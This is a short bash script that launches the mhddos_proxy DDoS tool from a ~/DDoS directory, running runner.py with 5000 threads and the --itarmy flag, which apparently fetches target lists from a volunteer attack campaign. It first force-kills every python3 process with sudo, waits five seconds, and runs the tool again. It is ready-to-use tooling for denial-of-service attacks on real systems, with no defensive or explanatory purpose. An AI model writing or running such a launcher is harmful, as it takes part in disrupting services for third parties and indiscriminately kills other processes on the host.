#!/bin/bash
sudo pkill -9 -f "python3"; cd "$HOME"/DDoS/mhddos_proxy; python3 runner.py -t 5000 --itarmy --debug
sleep 5
cd "$HOME"/DDoS/mhddos_proxy; python3 runner.py -t 5000 --itarmy --debug
